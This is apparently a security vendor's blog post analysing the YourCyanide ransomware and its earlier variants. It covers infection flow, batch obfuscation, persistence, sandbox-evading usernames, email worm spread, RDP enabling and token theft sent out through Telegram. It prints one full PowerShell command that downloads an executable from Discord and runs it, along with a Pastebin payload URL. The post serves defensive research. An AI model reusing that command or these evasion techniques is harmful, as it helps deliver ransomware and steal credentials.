YourCyanide contains multiple layers of obfuscation and takes advantage of custom environment variables and the Enable Delayed\nExpansion function to hide its activities. As part of its evasion strategy, YourCyanide will also pass through different files, downloading the\nsucceeding files via Discord and Pastebin with each step before eventually downloading the main payload.\n\nNote that the ransomware is still currently under development, so some portions of the routine — like the actual encryption portion — are not\nfinalized (YourCyanide currently renames the files under specific directories, but does not encrypt anything).\n\nFigure 1. An Obfuscated batch\n\nscript\n[The earliest sample of this ransomware, known as GonnaCope, was found by Twitter user Petrovic in April 2022. This variant possessed the](https://twitter.com/petrovic082/status/1519230065950826497)\nability to overwrite its victim's files — however, this was limited to the current directory in which the ransomware was being executed.\n\nUpon checking the latest variant of this malware, we observed that the malware author was sending messages to all users in the compromised\nnetwork notifying them of the infiltration. Along with this, another message was sent stating that \"Kekware and Kekpop were just the begining\"\n— indicating that the author was preparing a more sophisticated variant of the original ransomware.\n\nFigure 2. A message warning victims of potentially more\n\nsophisticated variants of the ransomware\nTable 1 shows when the additional variants of the original CMD/BAT-based ransomware were uploaded to VirusTotal.\n\n**Date earliest sample was uploaded to VirusTotal** **Ransomware sample**\n\n07 Apr 2022 GonnaCope\n\n07 May 2022 Kekpop\n\n11 May 2022 Kekware\n\n13 May 2022 YourCyanide\n\nTable 1. CMD-based ransomware samples and their date of upload to VirusTotal\n\n\n-----\n\n## YourCyanide technical analysis\n\n Infection flow\n\nFigure 3. YourCyanide infection routine\n\n\n-----\n\nFigure 4. Exfiltration of stolen information\n\n## Arrival\n\nIt initially arrives as an LNK file that contains the following PowerShell script for downloading the \"YourCyanide.exe\" 64-bit executable from\nDiscord and executing it:\n\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"(New-Object\nNet.WebClient).DownloadFile('hxxps://cdn.discordapp.com/attachments/974799607894769704/975527548983341056/YourCyanide.exe',\n'YourCyanide.exe')\"; start YourCyanide.exe\"\n\n\n-----\n\nFigure 5. LNK file containing the shellcode\n\nThis 64-bit executable file creates and executes a CMD file with the filename YourCyanide.cmd.\n\nFigure 6. Creating and executing YourCyanide.cmd\nThe dropped YourCyanide.cmd file contains a script downloaded from Pastebin that is saved using the same filename (YourCyanide.cmd).\n\nFigure 7. Code snippets from the YourCyanide.cmd\n\nfile\nThe ransomware will create a registry key in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce for cleanup purposes. It then runs\nadvpack.dll to delete the folder containing the malicious CMD file to remove traces of the downloader from the machine.\n\nFigure 8. Creating a registry key for cleanup\n\n## Analyzing YourCyanide.cmd\n\nThe downloaded script file contains 10 layers of obfuscated code, with each layer being needed to deobfuscate the succeeding layer. It takes\nadvantage of the Enable Extensions and Enable Delayed Extensions commands, causing variables within a batch file to be expanded at\nexecution time rather than at parse time.\n\nThe malware uses following format for its obfuscation technique:\n\n%parameter:~index of character, number of characters to take%\n\n%Kesik:~19,1%, will return 1 character from the index value 19 of parameter Kesik\n\nFigure 9. Code snippets showing Enable Extensions\n\nand Enable Delayed Extensions commands\nUpon execution, YourCyanide sets its file attributes as hidden and as a system file, then launches five maximized Command Prompt windows.\n\n\n-----\n\nFigure 10. Launching five maximized Command Prompt windows\n\nIt will then try to add a user \"session\" to the Administrators group using the net localgroup command.\n\nFigure 11. The net localgroup command being run\n\nIt also creates an autostart mechanism for persistence by creating a registry key in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nand then copying itself to the Startup directory. It also disables Task Manager by modifying its registry entry.\n\nFigure 12. Code snippet showing YourCyanide\n\ncreating a registry key and copying itself to the Startup directory for persistence.\nIt then checks if %SystemDrive%\\AutoExec.bat exists, and if so, it deletes the original and then copies itself and sets the file to read only,\nhidden, and as a system file.\n\nIt also avoids machines with the following usernames, some of which, according to our research, are usernames used by malware researchers\nand sandbox systems — implying that the malware author is noting which machines should be evaded:\n\na.monaldo\nGeorge\ngeorge\nhelp\nkarolisliucveikis\nSoumy\nguent\n\nAfter checking the username of the infected machine, it drops and executes a batch file in UserProfile\\Documents\\black.bat. This batch file is\nresponsible for continuously opening the Blank Screen Saver file, which renders the machine inaccessible while the malware is running.\n\nFigure 13. Dropping and executing the batch file\n\nYourCyanide also terminates several services and security applications by concatenating variables to form the strings \"net stop,\" \"norton,\"\n\"symantec,\" and \"McAfee.\"\n\n\n-----\n\nFigure 14. Code snippet showing YourCyanide stopping\n\nservices and security software\nIt then swaps the mouse button using the SwapMouseButton Export function of the user32.dll file.\n\nAfter terminating applications, it renames files from the following directories to <Random>.<file extension>.<Random>.cyn:\n\n%MyDesktop%\n%MyDocuments%\n%MyMusic%\n%MyPictures%\n%MyVideos%\n%Downloads%\n\nAlthough no actual encryption is being performed, users will still be heavily inconvenienced due to their files being renamed — especially for\nthose with large amounts of files in these particular folders. Furthermore, since the malware is still currently under development, it’s likely that\nthe malware authors are still finalizing the encryption portion of the routine.\n\nIt then creates the following ransom notes and drops them into %MyDesktop%:\n\nYcynNote.txt\nother.txt\n\nFigure 15. The ransom notes dropped by YourCyanide (including the\n\nwarning shown in Figure 2)\nIt features two instances in which it copies itself to batch files and then appends the malicious code (shown in Figure 16) to win.ini and\nsystem.ini.\n\nFigure 16. The malicious code that are appended to win.ini and system.ini\n\n\n-----\n\nte pe o g ts out e, t de etes t e b ac bat e t e % y ocu e ts% d ecto y, c s espo s b e o e de g t e ac e\ninaccessible. Deleting the file will stop the blank screen saver file from continuously opening.\n\nFigure 17. The black.bat file responsible for rendering the infected machine inaccessible\n\n## Lateral movement\n\nYourCyanide is also capable of spreading via email and to different drives. It creates two VBScript files, mail.vbs and loveletter.vbs, that send\nan email using the following subjects (with itself as an attachment):\n\nI Have a crush on you\nCheck This Out\n\nIt then copies itself to the following drives or directories:\n\nD:\nE:\nF:\nG:\nH:\n%UserProfile%\n\n## Bypassing remote desktop connections and firewalls\n\nYourCyanide enables Remote Desktop Connection (RDP) by using the netsh commands shown in Figure 18.\n\nFigure 18. Using netsh commands for RDP\n\nconnection\nThe ransomware opens multiple local ports by adding firewall rules for Transmission Control Protocol (TCP) and User Datagram Protocol\n(UDP) connections via the netsh advfirewall function.\n\nFigure 19. Opening multiple\n\nlocal ports\nIt then downloads and executes another CMD file (ycynlog.cmd) from hxxps://pastebin[.]com/raw/2K5m42Xp.\n\n## Exfiltration of stolen information\n\nThe ycynlog.cmd file is responsible for the collection and exfiltration of stolen information from the compromised machine. Like the main file, it\nalso features multiple layers of obfuscation. Upon execution, the file hides itself and creates its autostart mechanism by producing a registry\nkey in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and by copying itself to the Startup directory.\n\nThe malware uses the Telegram chatbot API to exfiltrate the stolen information and sets it to variable \"Webhook\"\n\nFigure 20. Using the Telegram Chatbot API for data\n\nexfiltration\nIt downloads another executable from Discord (GetToken.exe). Running this executable creates the file MyTokens.txt, which contains stolen\naccess token data from different applications such as Chrome, Discord, and Microsoft Edge.\n\n\n-----\n\nFigure 21. Downloading GetToken.exe\n\nIt also collects the following machine information and stores it in userdata.txt:\n\nIP addresses\nMAC addresses\nCPU Information\nMemory Size\nPartition information\nSystem specifications\nOS product key\nCurrently running processes\n\nBoth Tokens.txt and userdata.txt will then be sent via Telegram chatbot API using the curl command.\n\nWe also discovered that YourCyanide exfiltrates Minecraft-related credentials.\n\nFigure 22. Exfiltrating Minecraft-related credentials\n\nFinally, it downloads another executable from Google Docs and executes it using the parameter \"/stext ForME.txt\". ForMe.txt will then be sent\nto the Telegram chatbot. While the Google Docs link is currently inaccessible, and therefore a sample can't be sourced, we noticed that it is run\nusing the same parameter as the sample \"passwords.exe,\" which is also used by the earlier Kekpop variant. The parameter \"/stext\" is\nemployed when executing the file, which is similar to the WebBrowserPassView application used to retrieve credentials stored by various web\nbrowsers such as Internet Explorer (Version 4.0 - 10.0), Mozilla Firefox (all versions), Google Chrome, Safari, and Opera.\n\nFiguring 23. Downloading the executable from Google\n\nDocs\nThe file created from executing passwords.exe contains saved passwords that are stored in Google Chrome.\n\n\n-----\n\nFigure 24. The file created from executing\n\npasswords.exe\n\n## Avoiding usernames\n\nOf the usernames this malware avoids, three in particular stand out. Namely: a.monaldo, karolisliucveikis, and soumy. Upon further research,\nwe discovered that these are usernames  from sandbox environments.\n\nThe username of the sandbox machine used by Hunter Yomi\n\nFigure 25.

Screenshot showing the soumy username Image from sonicwall.com\n\n## Variant Comparison\n\nThe team analyzed these CMD-based ransomwares and came up with the following table that compares each variant and their differences.\nOne notable difference is that GonnaCope, the earliest variant, does not collect user credentials from web browsers and list of applications,\nand does not enable RDP connections. Furthermore, it does not execute black.bat, the file that temporarily causes the machine to become\ninaccessible while the malware executes its payload. We also observed that the BTC address used by GonnaCope is different from the BTC\naddress of the succeeding variants and it contains a different ransom note format. The variants also differ in their delivery — shifting between\narriving as an archive, executable files, or LNK files that drop the CMD-based ransomware. The payloads are also located in different parts of\nthe chain, with some being found in the main CMD file, while others are found in files that are downloaded from Pastebin and Discord.\n\n\n-----\n\n**Behavior** **GonnaCope** **Kekware** **Kekpop**\n\n\nCreates auto-start\nmechanism\n\nDisables task\nmanager\n\nChecks the username\nof the machine\n\nCreates and\nexecutes black.bat to\ncontinuously turn on\nBlank Screen Saver\n\n\nYes Yes Yes\n\nYes Yes Yes\n\nNo Yes Yes\n\nNo Yes Yes\n\n\nStops services Yes Yes Yes\n\n\nTerminates\napplications\n\nSwaps mouse\nbuttons\n\n\nYes Yes Yes\n\nYes Yes Yes\n\n\nRenames files GonnaCope.cope\n\nrandom.cope\n\n\n<Random>.<file extension>.<Random>.cyn <Random>.<file exte\n\n\nGathers a list of\ninstalled applications\n\nCollects machine\ninformation\n\nCollects token access\ndata\n\nCollects passwords\nsaved in web\nbrowsers\n\nSends an email with\na copy of itself as an\nattachment\n\n\nNo Yes Yes\n\nYes Yes Yes\n\nYes Yes Yes\n\nNo Yes Yes\n\nYes Yes Yes\n\n\nSubject of sent email Is this you?\n\nHere is that document you needed\n\n\nI Have a crush on you\n\nCheck This Out\n\n\nI Have a crush on yo\n\n\nCopies itself in drives Yes Yes Yes\n\n\nEnables RDP\nconnection\n\n\nNo Yes Yes\n\n\n-----\n\nRansom note\nmessage\n\n\nYour files are unusable pay $100 in bitcoin to\nbc1qlly4puaz7pz3zmph8n2d620jc2j60qf4ve5qll\nto get your files back or allow it into outlook for\na decryption key\n\n\nQ: What happened to my files\n\nA: They got encrypted by kekware.\nQ: how can i get them back\n\nA: You can get them back by paying $500 in\nbitcoin to this btc wallet\nbc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf.\n\nQ: What happens if i dont pay\n\nA: You will never get your files back.\n\n\nQ: What happened t\nA: They got encrypte\n\nQ: how can i get the\nA: You can get them\nbitcoin to this btc wa\nbc1qrl532s9r2qge8d\n\nQ: What happens if\nA: You will never get\n\nQ: Is this related to k\nA: No fuck kpop\n\n\nOther messages kekpop is on your ne\n\nBTC wallet used bc1qlly4puaz7pz3zmph8n2d620jc2j60qf4ve5qll bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf bc1qrl532s9r2qge8d\n\n## Conclusion\n\nThe continued use of heavily obfuscated script results in very low detections for these CMD-based ransomware, making it easier to\ncompromise their victims’ machines. Even if the technique is not new, the use of multilayer custom environment variables for obfuscation is\nhighly effective in avoiding detection. These ransomware variants are also capable of downloading multiple payloads, performing lateral\nmovement via emails, and using Discord, Pastebin and even Microsoft document links.\n\nFigure 28. Low detections of CMD-based\n\nransomware\nFrom our analysis, we are able to infer that the malware author is actively monitoring the reports created by malware researchers by taking\nnote of the usernames found in their sandbox logs and reports, and including them in the evasion list of usernames and machines that is part\nof the initialization process of the malware being used.\n\nRansomware variants that possess multiple capabilities — such as the one analyzed in this blog entry — are gaining popularity. While\n[YourCyanide and its other variants are currently not as impactful as other families, it represents an interesting update to ransomware kits by](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight)\nbundling a worm, a ransomware, and an information stealer into a single mid-tier ransomware framework.\n\nIt is also likely that these ransomware variants are in their development stages, making it a priority to detect and block them before they can\nevolve further and do even more damage.\n\n## Trend Micro solutions\n\nA
